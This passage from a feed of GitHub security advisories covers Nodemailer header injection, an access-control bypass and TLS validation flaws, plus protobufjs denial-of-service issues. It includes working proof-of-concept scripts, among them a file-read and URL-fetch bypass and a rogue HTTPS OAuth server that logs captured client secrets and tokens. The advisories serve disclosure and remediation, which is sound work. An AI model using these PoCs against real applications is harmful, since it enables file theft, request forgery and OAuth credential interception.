VARIANTS=help=true,unsubscribe=true,subscribe=true,post=true,owner=true,archive=true,id=true
</code></pre>
<p>Expected vulnerable output: <code>POSITIVE_HAS_INJECTED=true</code> and all listed variants ending in <code>=true</code>. Expected negative/control output: <code>CONTROL_HAS_INJECTED=false</code>, showing the ordinary <code>Subject</code> header path does not create a separate injected header.</p>
<p>Cleanup: none required; the PoC uses only in-memory message generation.</p>
<h3 id="impact">Impact</h3>
<p>A lower-privileged attacker who can influence <code>list.*.comment</code> fields in an application using Nodemailer can inject arbitrary additional headers into generated email messages. This can alter message semantics and downstream mail-client or mail-filter behavior, including adding attacker-controlled metadata headers. The PoC confirms header-boundary injection in the generated RFC822 output; it does not demonstrate SMTP command injection, recipient injection, or code execution.</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<p>Normalize or reject CR and LF in <code>list.*.comment</code> before constructing prepared <code>List-*</code> headers. Prefer sharing the same CRLF-neutralization behavior used for ordinary header values, or avoid using <code>prepared: true</code> for caller-controlled list comment content. Add regression tests for CRLF in every documented <code>list</code> comment-bearing field and verify that generated messages do not contain attacker-controlled standalone headers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-268h-hp4c-crq3">https://github.com/nodemailer/nodemailer/security/advisories/GHSA-268h-hp4c-crq3</a></li>
<li><a href="https://github.com/advisories/GHSA-268h-hp4c-crq3">https://github.com/advisories/GHSA-268h-hp4c-crq3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-268h-hp4c-crq3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T17:36:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nodemailer] Nodemailer jsonTransport bypasses disableFileAccess and disableUrlAccess during message normalization]]></title>
        <id>https://github.com/advisories/GHSA-wqvq-jvpq-h66f</id>
        <link href="https://github.com/advisories/GHSA-wqvq-jvpq-h66f"/>
        <updated>2026-06-15T17:35:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Nodemailer's <code>disableFileAccess</code> and <code>disableUrlAccess</code> options are intended to prevent message content and attachments from reading local files or fetching URLs. The normal MIME streaming path enforces those options in <code>MimeNode._getStream()</code>. However, <code>jsonTransport</code> serializes messages by calling <code>mail.normalize()</code>, which resolves <code>html</code>, <code>text</code>, alternatives, calendar events, and attachments through <code>shared.resolveContent()</code> before MIME generation. <code>shared.resolveContent()</code> reads local files and fetches HTTP(S) URLs directly, without receiving or checking <code>disableFileAccess</code> or <code>disableUrlAccess</code>.</p>
<p>As a result, applications that use <code>jsonTransport</code> as a safe serializer or queue payload generator while relying on <code>disableFileAccess</code> / <code>disableUrlAccess</code> can still be made to read local files into the generated JSON output or make outbound HTTP requests when an attacker controls message content fields such as attachment <code>path</code> or <code>text.href</code>.</p>
<p>The same missing-enforcement root cause is also reachable before normal streaming when <code>attachDataUrls</code> causes <code>_convertDataImages()</code> to call <code>mail.resolveContent(mail.data, 'html', ...)</code>; this should be fixed with the same access-control check.</p>
<h3 id="details">Details</h3>
<p>Source-to-sink evidence:</p>
<ul>
<li><code>lib/nodemailer.js:42-45</code> selects <code>JSONTransport</code> when <code>createTransport({ jsonTransport: true, ... })</code> is used.</li>
<li><code>lib/mailer/mail-message.js:34-39</code> copies transport-level <code>disableFileAccess</code> and <code>disableUrlAccess</code> options into <code>mail.data</code>.</li>
<li><code>lib/json-transport/index.js:52-76</code> serializes mail by calling <code>mail.normalize((err, data) =&gt; ...)</code>.</li>
<li><code>lib/mailer/mail-message.js:46-135</code> implements <code>resolveAll()</code> and calls <code>shared.resolveContent(...args, ...)</code> for <code>html</code>, <code>text</code>, <code>watchHtml</code>, <code>amp</code>, <code>icalEvent</code>, alternatives, and attachments.</li>
<li><code>lib/shared/index.js:506-562</code> implements <code>resolveContent()</code>.</li>
<li><code>lib/shared/index.js:540-541</code> fetches HTTP(S) content with <code>nmfetch(content.path || content.href)</code>.</li>
<li><code>lib/shared/index.js:549-550</code> reads local files with <code>fs.createReadStream(content.path)</code>.</li>
<li><code>shared.resolveContent()</code> does not check <code>disableFileAccess</code> or <code>disableUrlAccess</code> and does not receive those flags.</li>
</ul>
<p>Control path showing intended enforcement:</p>
<ul>
<li><code>lib/mail-composer/index.js:358-359</code>, <code>lib/mail-composer/index.js:367-368</code>, and sibling child-node creation paths pass <code>disableUrlAccess</code> and <code>disableFileAccess</code> into <code>MimeNode</code>.</li>
<li><code>lib/mime-node/index.js:51-52</code> stores those flags.</li>
<li><code>lib/mime-node/index.js:984-995</code> rejects file paths with <code>EFILEACCESS</code> when <code>disableFileAccess</code> is set.</li>
<li><code>lib/mime-node/index.js:998-1009</code> rejects URLs with <code>EURLACCESS</code> when <code>disableUrlAccess</code> is set.</li>
<li><code>test/mail-composer/mail-composer-test.js:1028-1044</code> includes a normal MIME-streaming test that expects file access to be blocked when <code>disableFileAccess: true</code>.</li>
</ul>
<p>Additional same-root-cause variant:</p>
<ul>
<li><code>lib/mailer/index.js:406-434</code> implements <code>_convertDataImages()</code> for <code>attachDataUrls</code>.</li>
<li><code>lib/mailer/index.js:407-410</code> calls <code>mail.resolveContent(mail.data, 'html', ...)</code> when <code>attachDataUrls</code> is enabled and <code>mail.data.html</code> is present.</li>
<li>Because <code>mail.resolveContent()</code> delegates to <code>shared.resolveContent()</code> at <code>lib/mailer/mail-message.js:42-44</code>, an object-form <code>html: { path: ... }</code> or <code>html: { href: ... }</code> can be resolved before the later MIME streaming enforcement sees the content.</li>
<li>This variant requires <code>attachDataUrls</code> to be enabled, so the main reportable default/common path is <code>jsonTransport</code>; both should be fixed by enforcing access flags inside the pre-resolution helper or passing policy into it.</li>
</ul>
<p>Default/common exposure evidence:</p>
<ul>
<li><code>jsonTransport</code> is a shipped runtime transport selected by public <code>createTransport</code> options.</li>
<li><code>test/json-transport/json-transport-test.js:9-83</code> demonstrates that <code>jsonTransport</code> intentionally resolves file-backed <code>html</code> and attachments into JSON output.</li>
<li><code>disableFileAccess</code> and <code>disableUrlAccess</code> are documented by code and tests as security controls and are copied from transport options into message data for all transports.</li>
<li>The bypass does not require test-only code, external infrastructure, unsupported configuration, or maintainer-only APIs.</li>
</ul>
<p>False-positive screening and negative controls:</p>
<ul>
<li>The local PoC used the same <code>disableFileAccess: true</code> and <code>disableUrlAccess: true</code> transport options for both <code>jsonTransport</code> and normal <code>streamTransport</code> controls.</li>
<li><code>jsonTransport</code> read the temporary local fixture file and embedded the content in JSON despite <code>disableFileAccess: true</code>.</li>
<li><code>streamTransport</code> with the same attachment and <code>disableFileAccess: true</code> rejected with <code>EFILEACCESS</code>.</li>
<li><code>jsonTransport</code> fetched a local HTTP listener despite <code>disableUrlAccess: true</code>.</li>
<li><code>streamTransport</code> with the same URL and <code>disableUrlAccess: true</code> rejected with <code>EURLACCESS</code>.</li>
<li>The local URL proof used only <code>127.0.0.1</code> and did not contact external infrastructure.</li>
</ul>
<p>Affected version evidence and uncertainty:</p>
<ul>
<li>Confirmed vulnerable: <code>nodemailer</code> 8.0.8 at commit <code>15138a84c543c20aa399218534cdbbfa2ea1ce55</code>.</li>
<li>Git history shows <code>jsonTransport</code> has existed since commit <code>d78b63b</code> (2017-02-09, "Added test for json transport"), and <code>disableFileAccess</code> appears in historical setup commit <code>6218b8d</code> (2017-01-31), but older versions were not dynamically tested during this audit.</li>
<li>Affected range is therefore recorded as unknown beyond the confirmed current version.</li>
<li>No patched version was identified in this checkout.</li>
</ul>
<p>Severity rationale:</p>
<ul>
<li>AV: The vulnerable library path is typically reached through an application-level message submission or rendering/queueing feature.</li>
<li>AC: A single message field using <code>path</code> or <code>href</code> triggers the bypass when <code>jsonTransport</code> is used.</li>
<li>PR: Conservative assumption that the attacker is a lower-privileged user of an application that accepts partially user-controlled message objects. Some deployments may expose this unauthenticated, but that was not assumed.</li>
<li>UI: No user interaction is required after the application accepts the message object.</li>
<li>S: The impact remains in the embedding application/library security scope.</li>
<li>C: Local file contents can be copied into the generated JSON output when the application later stores, logs, returns, or forwards that JSON.</li>
<li>I: The attacker can induce outbound HTTP requests to attacker-chosen or internal URLs from the application host when URL access was intended to be disabled.</li>
<li>A: No availability impact was demonstrated; the PoC used bounded local files and a localhost listener only.</li>
</ul>
<p>Final self-review:</p>
<ul>
<li>Reproduction evidence was generated locally from this checkout using only a temporary file under the OS temp directory and a local <code>127.0.0.1</code> HTTP listener.</li>
<li>The PoC included positive proof for file read and URL fetch, plus negative controls showing normal <code>streamTransport</code> rejects the same inputs with <code>EFILEACCESS</code> and <code>EURLACCESS</code>.</li>
<li>The proof is non-destructive, performs no external network traffic, and deletes its temporary fixture.</li>
<li>Reachability, package exposure, policy-enforcement bypass, same-root-cause variant, and false-positive controls were checked as described above.</li>
<li>The affected range is not overclaimed; only the current tested version is confirmed vulnerable.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>From a clean checkout of <code>nodemailer</code> at commit <code>15138a84c543c20aa399218534cdbbfa2ea1ce55</code>, run:</p>
<pre><code class="language-bash">node &lt;&lt;'NODE'
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const nodemailer = require('./');
const marker = 'NM_JSON_BYPASS_' + Date.now();
const fixture = path.join(os.tmpdir(), 'nodemailer-json-bypass-' + process.pid + '.txt');
fs.writeFileSync(fixture, marker);
function sendMail(transport, data) {
  return new Promise((resolve, reject) =&gt; transport.sendMail(data, (err, info) =&gt; err ? reject(err) : resolve(info)));
}
(async () =&gt; {
  const jsonTransport = nodemailer.createTransport({ jsonTransport: true, disableFileAccess: true, disableUrlAccess: true });
  const jsonInfo = await sendMail(jsonTransport, {
    from: 'sender@example.test',
    to: 'recipient@example.test',
    subject: 'json file bypass',
    text: 'body',
    attachments: [{ filename: 'secret.txt', path: fixture }]
  });
  const jsonMessage = JSON.parse(jsonInfo.message);
  const decoded = Buffer.from(jsonMessage.attachments[0].content, 'base64').toString('utf8');
  console.log('JSON_FILE_BYPASS=' + (decoded === marker));
  console.log('JSON_FILE_CONTENT=' + decoded);

  const streamTransport = nodemailer.createTransport({ streamTransport: true, buffer: true, disableFileAccess: true });
  try {
    await sendMail(streamTransport, {
      from: 'sender@example.test',
      to: 'recipient@example.test',
      subject: 'stream control',
      text: 'body',
      attachments: [{ filename: 'secret.txt', path: fixture }]
    });
    console.log('STREAM_FILE_CONTROL=NO_ERROR');
  } catch (err) {
    console.log('STREAM_FILE_CONTROL=' + err.code);
  }

  const server = http.createServer((req, res) =&gt; {
    console.log('LOCAL_HTTP_REQUEST=' + req.method + ' ' + req.url);
    res.end('LOCAL_HTTP_MARKER');
  });
  await new Promise(resolve =&gt; server.listen(0, '127.0.0.1', resolve));
  const url = 'http://127.0.0.1:' + server.address().port + '/private';
  const jsonUrlInfo = await sendMail(jsonTransport, {
    from: 'sender@example.test',
    to: 'recipient@example.test',
    subject: 'json url bypass',
    text: { href: url }
  });
  const jsonUrlMessage = JSON.parse(jsonUrlInfo.message);
  console.log('JSON_URL_BYPASS=' + (jsonUrlMessage.text === 'LOCAL_HTTP_MARKER'));
  const streamUrlTransport = nodemailer.createTransport({ streamTransport: true, buffer: true, disableUrlAccess: true });
  try {
    await sendMail(streamUrlTransport, {
      from: 'sender@example.test',
      to: 'recipient@example.test',
      subject: 'stream url control',
      text: { href: url }
    });
    console.log('STREAM_URL_CONTROL=NO_ERROR');
  } catch (err) {
    console.log('STREAM_URL_CONTROL=' + err.code);
  }
  server.close();
  fs.unlinkSync(fixture);
})().catch(err =&gt; { try { fs.unlinkSync(fixture); } catch (E) {} console.error(err &amp;&amp; err.stack || err); process.exit(1); });
NODE
</code></pre>
<p>Observed output in this environment:</p>
<pre><code class="language-text">JSON_FILE_BYPASS=true
JSON_FILE_CONTENT=NM_JSON_BYPASS_1779802076150
STREAM_FILE_CONTROL=EFILEACCESS
LOCAL_HTTP_REQUEST=GET /private
JSON_URL_BYPASS=true
STREAM_URL_CONTROL=EURLACCESS
</code></pre>
<p>Expected vulnerable output: <code>JSON_FILE_BYPASS=true</code>, the printed temporary marker in <code>JSON_FILE_CONTENT</code>, a <code>LOCAL_HTTP_REQUEST=GET /private</code> line, and <code>JSON_URL_BYPASS=true</code>. Expected negative/control output: <code>STREAM_FILE_CONTROL=EFILEACCESS</code> and <code>STREAM_URL_CONTROL=EURLACCESS</code>, showing the same policy flags work in the normal streaming transport.</p>
<p>Cleanup: the PoC removes its temporary fixture file before exiting and closes the local HTTP server.</p>
<h3 id="impact">Impact</h3>
<p>If an application uses <code>jsonTransport</code> to safely serialize or queue partially user-controlled Nodemailer message objects while relying on <code>disableFileAccess</code> / <code>disableUrlAccess</code>, an attacker can bypass those protections. The file-read variant can copy local file contents into the generated JSON message output. The URL-fetch variant can force outbound HTTP requests from the application host to local or internal services despite URL access being disabled. The impact depends on what message fields the embedding application exposes and where it stores or returns the generated JSON, but the local PoC confirms both protected sink operations are reached.</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<p>Enforce <code>disableFileAccess</code> and <code>disableUrlAccess</code> inside <code>shared.resolveContent()</code> or pass an explicit policy object into every pre-resolution call and reject protected <code>path</code> / <code>href</code> values before opening files or fetching URLs. Apply the same fix to <code>jsonTransport</code> normalization and the <code>attachDataUrls</code> pre-plugin path. Add regression tests showing <code>jsonTransport</code> returns <code>EFILEACCESS</code> / <code>EURLACCESS</code> for file and URL content when those flags are set, and that <code>attachDataUrls</code> cannot resolve object-form <code>html.path</code> / <code>html.href</code> when the corresponding access flag is disabled.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-wqvq-jvpq-h66f">https://github.com/nodemailer/nodemailer/security/advisories/GHSA-wqvq-jvpq-h66f</a></li>
<li><a href="https://github.com/advisories/GHSA-wqvq-jvpq-h66f">https://github.com/advisories/GHSA-wqvq-jvpq-h66f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wqvq-jvpq-h66f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T17:35:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nodemailer] Nodemailer: Improper TLS Certificate Validation in OAuth2 Token Fetch Enables Credential Interception]]></title>
        <id>https://github.com/advisories/GHSA-r7g4-qg5f-qqm2</id>
        <link href="https://github.com/advisories/GHSA-r7g4-qg5f-qqm2"/>
        <updated>2026-06-15T17:34:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Nodemailer disables TLS certificate verification in its internal HTTPS fetch client through the use of rejectUnauthorized: false inside lib/fetch/index.js.</p>
<p>As a result, OAuth2 token requests trust invalid or self-signed HTTPS certificates and transmit sensitive OAuth credentials over connections that should fail TLS validation.</p>
<p>An attacker in a machine-in-the-middle position can intercept OAuth2 credential exchanges and capture:</p>
<ul>
<li>OAuth client_secret</li>
<li>refresh_token</li>
<li>access tokens</li>
</ul>
<p>The issue was verified through runtime testing using a self-signed HTTPS OAuth endpoint.</p>
<h3 id="details">Details</h3>
<p>Root Cause</p>
<p>The issue originates from the internal HTTPS fetch implementation used by Nodemailer for OAuth2 token retrieval and related outbound HTTPS requests.</p>
<p>Inside:</p>
<p><code>lib/fetch/index.js</code></p>
<p>the request options contain:</p>
<p><code>rejectUnauthorized: false</code></p>
<p>This disables TLS peer certificate verification globally for the internal HTTPS client unless explicitly overridden through optional TLS configuration.</p>
<p>As a result:</p>
<ul>
<li>self-signed certificates are trusted</li>
<li>invalid CA chains are accepted</li>
<li>hostname validation is bypassed</li>
<li>attacker-controlled HTTPS endpoints are treated as trusted</li>
</ul>
<p>This violates expected HTTPS security guarantees.</p>
<p><strong>Vulnerable Flow</strong></p>
<p>The vulnerable execution chain is:</p>
<p>OAuth2 Transport
        ↓
XOAuth2 token generation
        ↓
Internal HTTPS fetch client
        ↓
HTTPS request with rejectUnauthorized:false
        ↓
Attacker-controlled/self-signed endpoint trusted
        ↓
OAuth credentials <strong>transmitted</strong></p>
<h3 id="poc">PoC</h3>
<p><strong>Environment</strong></p>
<h4 id="mail-api-appserverjs">Mail API (app/server.js)</h4>
<pre><code>const express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config();

const app = express();

app.use(express.json());

const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: process.env.SMTP_PORT,
    secure: false,
    auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
    }
});

app.post("/send", async (req, res) =&gt; {
    try {
        const { to, subject, text, html } = req.body;

        const info = await transporter.sendMail({
            from: `"Mailer" &lt;${process.env.SMTP_USER}&gt;`,
            to,
            subject,
            text,
            html
        });

        res.json({
            success: true,
            messageId: info.messageId
        });

    } catch (err) {
        console.error(err);
        res.status(500).json({
            success: false,
            error: err.message
        });
    }
});

app.listen(process.env.PORT, () =&gt; {
    console.log(`Mailer running on port ${process.env.PORT}`);
});
</code></pre>
<h4 id="malicious-https-oauth-server-pocevil-oauthjs">Malicious HTTPS OAuth Server (poc/evil-oauth.js)</h4>
<pre><code>const https = require('https');
const fs = require('fs');

https.createServer({
    key: fs.readFileSync('./key.pem'),
    cert: fs.readFileSync('./cert.pem')
}, (req, res) =&gt; {

    console.log('\n==== REQUEST INTERCEPTED ====');
    console.log(req.method, req.url);

    let body = '';

    req.on('data', chunk =&gt; {
        body += chunk;
    });

    req.on('end', () =&gt; {

        console.log('\nPOST BODY:');
        console.log(body);

        res.writeHead(200, {
            'Content-Type': 'application/json'
        });

        res.end(JSON.stringify({
            access_token: 'attacker_token',
            expires_in: 3600
        }));
    });

}).listen(8443, () =&gt; {
    console.log('Malicious HTTPS OAuth server listening on 8443');
});
</code></pre>
<h4 id="nodemailer-oauth2-test-testjs">Nodemailer OAuth2 Test (test.js)</h4>
<pre><code>const nodemailer = require('./');

const transporter = nodemailer.createTransport({
    service: 'gmail',

    auth: {
        type: 'OAuth2',

        user: 'redacted@example.com',

        clientId: 'CLIENT_ID_REDACTED',
        clientSecret: 'CLIENT_SECRET_REDACTED',

        refreshToken: 'REFRESH_TOKEN_REDACTED',

        accessUrl: 'https://localhost:8443/token'
    }
});

transporter.sendMail({
    from: 'redacted@example.com',
    to: 'redacted@example.com',
    subject: 'PoC',
    text: 'test'

}, (err, info) =&gt; {

    console.log('\n==== NODEMAILER RESULT ====');

    if (err) {
        console.error(err);
    } else {
        console.log(info);
    }
});
</code></pre>
<p><strong>Steps to Reproduce</strong></p>
<ul>
<li>Start malicious HTTPS OAuth server:</li>
<li>node poc/evil-oauth.js</li>
<li>Run Nodemailer OAuth2 test:</li>
<li>node test.js</li>
<li>Observe intercepted OAuth2 request body on the malicious HTTPS server.</li>
</ul>
<p><strong>PIC</strong>
<img src="https://github.com/user-attachments/assets/fdeafeb4-c0c5-49f8-beeb-e7f945be0516" alt="image" height="1029" width="1919"></p>
<h3 id="impact">Impact</h3>
<ul>
<li>OAuth credential theft</li>
<li>unauthorized email access</li>
<li>persistent token abuse</li>
<li>unauthorized mail sending</li>
<li>mailbox compromise</li>
<li>interception/tampering of OAuth responses</li>
</ul>
<p>The issue effectively downgrades HTTPS security protections for sensitive OAuth credential exchanges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-r7g4-qg5f-qqm2">https://github.com/nodemailer/nodemailer/security/advisories/GHSA-r7g4-qg5f-qqm2</a></li>
<li><a href="https://github.com/advisories/GHSA-r7g4-qg5f-qqm2">https://github.com/advisories/GHSA-r7g4-qg5f-qqm2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r7g4-qg5f-qqm2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T17:34:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[protobufjs] protobufjs: Denial of service through unbounded Any expansion during JSON conversion]]></title>
        <id>https://github.com/advisories/GHSA-wcpc-wj8m-hjx6</id>
        <link href="https://github.com/advisories/GHSA-wcpc-wj8m-hjx6"/>
        <updated>2026-06-15T17:30:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>protobufjs could recurse without a depth limit while converting decoded messages to plain objects or JSON. This affected generated <code>toObject()</code> conversion and the custom <code>google.protobuf.Any</code> JSON conversion path.</p>
<p>A crafted protobuf binary payload containing deeply nested <code>Any</code> values could cause the JavaScript call stack to be exhausted during conversion to JSON.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can provide protobuf binary data decoded by an application may be able to crash the process or otherwise cause message conversion to fail with a stack overflow.</p>
<p>This affects applications that decode untrusted protobuf input containing <code>google.protobuf.Any</code> values and then convert decoded messages to JSON or plain objects with JSON conversion enabled, for example through <code>JSON.stringify(message)</code>, <code>Message#toJSON()</code>, or <code>Type.toObject(message, { json: true })</code>.</p>
<p>Applications that only decode and re-encode protobuf binary data without converting decoded messages to JSON are not directly affected by this issue.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li>The application must decode protobuf binary data influenced by an attacker.</li>
<li>The application schema must include <code>google.protobuf.Any</code>, and the referenced <code>type_url</code> must resolve to a message type in the loaded protobuf root.</li>
<li>The application must convert the decoded message to JSON or a plain object through an affected conversion path.</li>
<li>The crafted input must contain deeply nested <code>Any</code> values that are expanded during conversion.</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>Avoid converting untrusted protobuf messages containing <code>google.protobuf.Any</code> values to JSON with affected versions. If immediate upgrade is not possible, reject or limit messages with deeply nested <code>Any</code> payloads at an outer protocol boundary where feasible, avoid JSON conversion of untrusted <code>Any</code> values, or isolate message conversion in a process that can be safely restarted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-wcpc-wj8m-hjx6">https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-wcpc-wj8m-hjx6</a></li>
<li><a href="https://github.com/advisories/GHSA-wcpc-wj8m-hjx6">https://github.com/advisories/GHSA-wcpc-wj8m-hjx6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wcpc-wj8m-hjx6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:30:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[protobufjs] protobufjs: Denial of service through unbounded Any expansion during JSON conversion]]></title>
        <id>https://github.com/advisories/GHSA-wcpc-wj8m-hjx6</id>
        <link href="https://github.com/advisories/GHSA-wcpc-wj8m-hjx6"/>
        <updated>2026-06-15T17:30:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>protobufjs could recurse without a depth limit while converting decoded messages to plain objects or JSON. This affected generated <code>toObject()</code> conversion and the custom <code>google.protobuf.Any</code> JSON conversion path.</p>
<p>A crafted protobuf binary payload containing deeply nested <code>Any</code> values could cause the JavaScript call stack to be exhausted during conversion to JSON.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can provide protobuf binary data decoded by an application may be able to crash the process or otherwise cause message conversion to fail with a stack overflow.</p>
<p>This affects applications that decode untrusted protobuf input containing <code>google.protobuf.Any</code> values and then convert decoded messages to JSON or plain objects with JSON conversion enabled, for example through <code>JSON.stringify(message)</code>, <code>Message#toJSON()</code>, or <code>Type.toObject(message, { json: true })</code>.</p>
<p>Applications that only decode and re-encode protobuf binary data without converting decoded messages to JSON are not directly affected by this issue.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li>The application must decode protobuf binary data influenced by an attacker.</li>
<li>The application schema must include <code>google.protobuf.Any</code>, and the referenced <code>type_url</code> must resolve to a message type in the loaded protobuf root.</li>
<li>The application must convert the decoded message to JSON or a plain object through an affected conversion path.</li>
<li>The crafted input must contain deeply nested <code>Any</code> values that are expanded during conversion.</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>Avoid converting untrusted protobuf messages containing <code>google.protobuf.Any</code> values to JSON with affected versions. If immediate upgrade is not possible, reject or limit messages with deeply nested <code>Any</code> payloads at an outer protocol boundary where feasible, avoid JSON conversion of untrusted <code>Any</code> values, or isolate message conversion in a process that can be safely restarted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-wcpc-wj8m-hjx6">https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-wcpc-wj8m-hjx6</a></li>
<li><a href="https://github.com/advisories/GHSA-wcpc-wj8m-hjx6">https://github.com/advisories/GHSA-wcpc-wj8m-hjx6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wcpc-wj8m-hjx6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T17:30:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[protobufjs] protobufjs : Schema-derived names can shadow runtime-significant properties]]></title>
        <id>https://github.com/advisories/GHSA-f38q-mgvj-vph7</id>
        <link href="https://github.com/advisories/GHSA-f38q-mgvj-vph7"/>
        <updated>2026-06-15T17:27:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>protobufjs accepted certain schema-derived names that could collide with properties used by protobufjs runtime helpers. The known affected names are fields named <code>hasOwnProperty</code>, field or oneof names such as <code>$type</code> when loaded through protobufjs JSON/reflection descriptors, and service methods whose generated helper name is <code>rpcCall</code>.</p>
<p>When affected message or service types were used, protobufjs could read schema-controlled data where it expected an own-property helper, reflected type metadata, or the base RPC helper. This could cause deterministic exceptions or recursive calls in affected decode post-checks, verification, object conversion, reflected JSON serialization, or protobufjs RPC helper invocation.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can provide or influence protobuf schemas or protobufjs JSON descriptors may be able to make affected message or service types unusable, resulting in denial of service for the affected processing path.</p>
<p>Applications using only trusted schemas are affected only if those schemas contain one of the problematic names and the application reaches the affected API path.</p>
<p>The issue is not known to allow code execution by itself.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li>The application must use an affected protobufjs version.</li>
<li>The application must load or use a schema or protobufjs JSON descriptor containing one of the problematic names:<ul>
<li>a field named <code>hasOwnProperty</code>,</li>
<li>a field or oneof named <code>$type</code> through protobufjs JSON/reflection descriptor input,</li>
<li>or a service method whose generated helper name is <code>rpcCall</code>.</li>
</ul>
</li>
<li>The application must reach the affected API path for that name: required-field decode post-checks, <code>verify</code>, or <code>toObject</code> for <code>hasOwnProperty</code>; reflected message JSON serialization for <code>$type</code>; or protobufjs RPC service invocation for <code>rpcCall</code>.</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>Do not load protobuf schemas or protobufjs JSON descriptors from untrusted sources with affected versions. If untrusted schemas or descriptors must be accepted, validate schema-derived field, oneof, and service method names before loading and reject the problematic names described above.</p>
<p>Applications using trusted schemas can avoid the issue by renaming affected fields or service methods, or by avoiding the affected API path.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-f38q-mgvj-vph7">https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-f38q-mgvj-vph7</a></li>
<li><a href="https://github.com/advisories/GHSA-f38q-mgvj-vph7">https://github.com/advisories/GHSA-f38q-mgvj-vph7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f38q-mgvj-vph7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T17:27:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[protobufjs-cli] protobufjs : Schema-derived names can shadow runtime-significant properties]]></title>
        <id>https://github.com/advisories/GHSA-f38q-mgvj-vph7</id>
        <link href="https://github.com/advisories/GHSA-f38q-mgvj-vph7"/>
        <updated>2026-06-15T17:27:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>protobufjs accepted certain schema-derived names that could collide with properties used by protobufjs runtime helpers. The known affected names are fields named <code>hasOwnProperty</code>, field or oneof names such as <code>$type</code> when loaded through protobufjs JSON/reflection descriptors, and service methods whose generated helper name is <code>rpcCall</code>.</p>
<p>When affected message or service types were used, protobufjs could read schema-controlled data where it expected an own-property helper, reflected type metadata, or the base RPC helper. This could cause deterministic exceptions or recursive calls in affected decode post-checks, verification, object conversion, reflected JSON serialization, or protobufjs RPC helper invocation.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can provide or influence protobuf schemas or protobufjs JSON descriptors may be able to make affected message or service types unusable, resulting in denial of service for the affected processing path.</p>
<p>Applications using only trusted schemas are affected only if those schemas contain one of the problematic names and the application reaches the affected API path.</p>
<p>The issue is not known to allow code execution by itself.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li>The application must use an affected protobufjs version.</li>
<li>The application must load or use a schema or protobufjs JSON descriptor containing one of the problematic names:<ul>
<li>a field named <code>hasOwnProperty</code>,</li>
<li>a field or oneof named <code>$type</code> through protobufjs JSON/reflection descriptor input,</li>
<li>or a service method whose generated helper name is <code>rpcCall</code>.</li>
</ul>
</li>
<li>The application must reach the affected API path for that name: required-field decode post-checks, <code>verify</code>, or <code>toObject</code> for <code>hasOwnProperty</code>; reflected message JSON serialization for <code>$type</code>; or protobufjs RPC service invocation for <code>rpcCall</code>.</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
